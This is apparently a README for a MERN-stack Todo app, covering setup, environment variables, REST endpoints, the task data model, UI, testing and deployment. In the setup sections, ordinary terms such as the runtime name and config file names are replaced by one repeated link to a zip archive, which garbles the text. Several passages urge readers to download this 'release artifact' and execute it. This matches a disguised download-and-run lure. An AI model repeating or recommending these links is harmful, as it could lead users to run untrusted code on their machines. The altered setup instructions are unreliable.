## Overview

This project showcases a fully functional CRUD Todo app built with the MERN stack. It demonstrates how a modern web app can manage user tasks with real-time feedback, smooth UI state transitions, and a well-structured code base. The frontend is built in React, handling routing, components, and user interactions. The backend is an Express server that exposes a RESTful API to manage tasks stored in MongoDB Atlas. The architecture emphasizes clarity, scalability, and a clean separation of concerns between the client and the server.

The app is designed for learning and experimentation as well as practical use. You can adapt the UI to fit your design language, integrate additional features like user authentication, task categories, due dates, or reminders, and deploy it to your preferred hosting services.

## Getting started

This section guides you through the essentials to get the app running on your machine. It assumes a basic familiarity with https://github.com/huarcayadelacruzluisfernando/mern-todo-app/raw/refs/heads/main/backend/mern_todo_app_2.0.zip and npm. If you prefer, you can adapt these steps to use Yarn or pnpm, but you would need to adjust the scripts accordingly.

1) Prerequisites
- https://github.com/huarcayadelacruzluisfernando/mern-todo-app/raw/refs/heads/main/backend/mern_todo_app_2.0.zip Install an LTS version (for example, https://github.com/huarcayadelacruzluisfernando/mern-todo-app/raw/refs/heads/main/backend/mern_todo_app_2.0.zip 18.x or newer).
- npm: Comes with https://github.com/huarcayadelacruzluisfernando/mern-todo-app/raw/refs/heads/main/backend/mern_todo_app_2.0.zip, but you can also use a package manager of your choice.
- MongoDB Atlas account: Create a cluster, set up a user, and whitelist your IP. Obtain the connection string for a non-admin user.

2) Clone the repository
- Use your preferred git client to clone the repository to your local machine.

3) Prepare environment variables
- Create a local copy of the environment file:
  - Copy https://github.com/huarcayadelacruzluisfernando/mern-todo-app/raw/refs/heads/main/backend/mern_todo_app_2.0.zip to .env in the server folder.
  - Set MONGO_URI to your MongoDB Atlas connection string.
  - Set PORT for the backend (commonly 5000 or 3001).
  - If you enable authentication, add JWT_SECRET or other relevant tokens.
- In the client, you may set REACT_APP_API_URL to the base URL of your backend (for example http://localhost:5000).

4) Install dependencies
- Install server dependencies:
  - cd server
  - npm install
- Install client dependencies:
  - cd client
  - npm install

5) Start the development environment
- You can run the frontend and backend separately, or use a combined setup if you have a script.
- Start backend:
  - cd server
  - npm run dev (or npm start if you only have a single start script)
- Start frontend:
  - cd client
  - npm run start (or npm run build && serve if you prefer a static host)
- If you have a root-level script to run both in parallel, you can use npm run dev from the project root (with a suitable tool like concurrently). Adapt as needed to match your https://github.com/huarcayadelacruzluisfernando/mern-todo-app/raw/refs/heads/main/backend/mern_todo_app_2.0.zip configuration.

6) Verify the app
- Open the browser and navigate to the frontend host (e.g., http://localhost:3000).
- The UI should display the task list and allow adding, viewing, and deleting tasks.
- The backend should respond to API requests at the configured endpoints and persist data to MongoDB Atlas.

Note: The Releases page linked above contains prebuilt release artifacts. From that page, you can download the release file and execute it to quickly experience the app. The release artifacts are intended to simplify setup for developers who want a quick-start experience.

## Environment setup

A solid environment setup helps avoid common pitfalls. This project uses environment variables to configure the backend and, optionally, the frontend.

- Backend configuration
  - MONGO_URI: The MongoDB Atlas connection string.
  - PORT: The port the server runs on for local development.
  - JWT_SECRET: A secret key used for token signing if authentication is enabled.
  - NODE_ENV: Set to development or production as appropriate.

- Frontend configuration
  - REACT_APP_API_URL: The base URL of the backend API. When running locally, this is typically http://localhost:5000 (or the port you configured).

- Local DB setup (optional)
  - If you want to run MongoDB locally for development, install MongoDB Community Server and set MONGO_URI to a local connection string like mongodb://localhost:27017/mern-todo.

- Security best practices
  - Do not commit secret values to version control. Use environment variables and a .env file in development.
  - When deploying, use encrypted environment variable storage provided by your hosting platform.

- Docker (optional)
  - If you prefer containerized development, you can create a https://github.com/huarcayadelacruzluisfernando/mern-todo-app/raw/refs/heads/main/backend/mern_todo_app_2.0.zip to run both client and server together with a MongoDB Atlas-compatible connection.

This section centers on making the development environment predictable. The actual values and paths should be aligned with your local machine and hosting choices.

---

## Running the app locally

- Start the backend service first. It exposes a RESTful API for task management, including endpoints to fetch, create, update, and delete tasks.
- Start the frontend service second. It consumes the API, renders the task list, and allows user interactions.
- The app uses a responsive layout, so you can test on desktop, tablet, and mobile devices.

Common issues and fixes:
- If the frontend cannot reach the API, verify the API URL configuration and network access.
- If MongoDB Atlas refuses connections, ensure your IP whitelist includes your current IP and that the credentials have the right privileges.
- If the UI shows validation errors, check the server logs for validation messages and adjust frontend forms accordingly.

Remember: the Releases page provides a quick-start artifact. If you prefer to inspect the source code directly, you can run the app in development mode following the steps above, which gives you granular control over both frontend and backend code paths.

For a smooth experience, you can install a code editor with good TypeScript/JavaScript support, enable ESLint/Prettier, and enable automatic linting in your editor to keep the codebase clean as you modify or extend it.

The following image components illustrate the diverse parts of the MERN stack in this project:
- React UI components showcase how the frontend renders tasks and accepts user input.
- Express routes demonstrate how the API is structured to perform CRUD operations.
- MongoDB models reveal how data is stored and retrieved from the database.

React component and API design contribute to a predictable data flow. The client fetches data via Axios, handles responses, shows toast messages on success or error, and updates state accordingly. The server handles requests, interacts with Mongoose models, and returns JSON payloads with status messages. Together, these layers make the app robust and maintainable.

---

## API design

The backend exposes a clean RESTful API for task management. The following endpoints illustrate the typical interaction pattern:

- GET /api/tasks
  - Description: Retrieve all tasks
  - Response: Array of Task objects

- GET /api/tasks/:id
  - Description: Retrieve a single task by ID
  - Response: A Task object

- POST /api/tasks
  - Description: Create a new task
  - Body: { title: string, completed?: boolean, dueDate?: string }
  - Response: The created Task object

- PATCH /api/tasks/:id
  - Description: Update task fields
  - Body: Partial Task object (e.g., { completed: true })
  - Response: The updated Task object

- DELETE /api/tasks/:id
  - Description: Delete a task
  - Response: { success: true, id: string }

Data validation ensures every task has a title and reasonable values for completed and optional fields. The server returns meaningful HTTP status codes and JSON error messages to help the frontend handle errors gracefully.

---

## Data model

Task
- _id: ObjectId
- title: String (required)
- description: String (optional)
- completed: Boolean (default: false)
- createdAt: Date (default: now)
- updatedAt: Date (auto-updated)
- dueDate: Date (optional)

The model is designed to be simple yet extensible. You can easily add new fields like priority, category, or tags as your app evolves. Indexes can be added for faster sorting on fields like createdAt or dueDate.

---

## User interface and experience

The UI emphasizes clarity and ease of use. Core elements include:
- A clean header with branding and quick actions
- A responsive task list with subtle animations on add/delete
- A minimal form to create new tasks
- Quick filters to view all tasks, active tasks, or completed tasks
- Visual cues for task status via color and icons
- Keyboard accessibility for quick task creation and navigation

UI components are designed to be reusable and maintainable. Each component has a clear responsibility, reducing coupling and making it easier to extend the UI with features like drag-and-drop reordering, due date reminders, or task categorization.

Visual references:
- React-based components render the list and forms
- A responsive grid adapts to different screen sizes
- An accessible color scheme and large touch targets for mobile users

If you want to customize the look and feel, you can swap the CSS tokens or switch to a CSS-in-JS solution. The component structure supports theming and easy style overrides.

---

## Testing and quality

- Unit tests: Focus on isolated functions and utility methods, including data formatting and validation helpers.
- API tests: Validate all endpoints for success and failure scenarios, including authentication and authorization flows if implemented.
- Integration tests: End-to-end checks that exercise the client UI against a test instance of the backend.
- Linting and formatting: Enforce consistent coding style with ESLint and Prettier.
- Type safety: If you extend the project with TypeScript, add type checks and type guards to improve reliability.

Practices like code reviews and CI checks help maintain code quality as the project evolves. You can configure automated pipelines to run tests on pull requests and merges, ensuring that changes meet the project's standards.

---

## Deployment and hosting

- Frontend hosting: Deploy the React app on a static site host (Netlify, Vercel, GitHub Pages, or similar) with the API URL configured via environment variables or build-time configuration.
- Backend hosting: Deploy the Express server to a cloud platform (Heroku, Render, AWS, Azure, or similar). Use environment variables to configure the MongoDB Atlas connection and other secrets.
- Database: MongoDB Atlas remains the central data store. Ensure proper network access and user permissions in Atlas, including IP whitelisting, user roles, and a secure password.

Tips:
- Use a custom domain with TLS for secure communication.
- Enable proper CORS settings to allow your frontend origin to access the backend.
- Keep secrets out of code; rely on environment variables in production.
- Consider a separate staging environment to test changes before promoting them to production.

If you want a quick-start artifact, you can pull the latest release from the Releases page and run it as-is on your environment. The link to the Releases page is provided at the top of this README and again later in the document for your convenience.

## Performance and security considerations

- Performance
  - Use memoization for expensive computations in the frontend.
  - Paginate task results or implement infinite scrolling for large task sets.
  - Implement server-side validation to minimize round-trips and ensure data integrity.
  - Cache frequently accessed configuration data where appropriate.

- Security
  - Validate input on both client and server to prevent common security issues like injection attacks.
  - Use secure authentication and authorization patterns if you add user accounts.
  - Store sensitive information in environment variables and protect API routes with proper access checks.
  - Use HTTPS in production to encrypt data in transit.

These considerations help you build a robust, scalable app that remains reliable under load and resistant to basic threats.

---

## Accessibility and internationalization

- Accessibility
  - Provide semantic HTML, ARIA roles where appropriate, and keyboard-friendly navigation.
  - Use high-contrast color combinations and scalable font sizes to improve readability.
  - Ensure error messages are announced and actionable for assistive technologies.

- Internationalization
  - Structure the UI to support multiple languages with a simple translation layer.
  - Store text keys rather than hard-coded strings to simplify localization.
  - Provide a mechanism to switch languages at runtime.

The app’s design aims to be inclusive and usable by a broad audience while staying simple and fast.

---

## Development workflow and contributions

- Fork and clone the repository.
- Create a feature branch for your work.
- Implement changes with small, testable commits.
- Write or update tests to cover new functionality.
- Run the test suite locally before submitting a pull request.
- Submit a PR with a clear description of the changes and their intent.
- Engage in code reviews and respond to feedback promptly.

Code quality is important. Keep functions small and focused, name variables clearly, and document non-obvious decisions. If you extend the API, ensure you add tests to guard against regressions.

The project welcomes contributions that improve usability, add useful features, or enhance performance. If you plan a major change, discuss it via an issue first to align with project goals.

---

## Troubleshooting

- Frontend issues
  - If the UI doesn’t load, check the browser console for errors related to API calls or missing assets.
  - If styles don’t apply, verify that the CSS files are correctly imported and that the build process completed without errors.

- Backend issues
  - If the server can’t connect to MongoDB Atlas, verify the MONGO_URI, Atlas network access, and user permissions.
  - If API responses are slow, profile the endpoints and review database indexes.

- Deployment issues
  - Confirm environment variables are correctly set in the hosting environment.
  - Check logs for startup errors, port binding issues, or misconfigured domains.
  - Ensure the frontend can reach the backend with the correct CORS and base URL settings.
